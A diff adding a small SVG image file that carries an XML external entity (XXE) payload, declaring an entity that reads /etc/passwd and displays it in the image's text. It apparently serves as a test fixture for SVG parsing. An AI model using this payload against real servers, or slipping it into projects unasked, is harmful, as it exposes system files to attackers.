@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120">
+    <rect width="120" height="120" fill="#FD366E"/>
+    <text x="10" y="60">&xxe;</text>
+</svg>
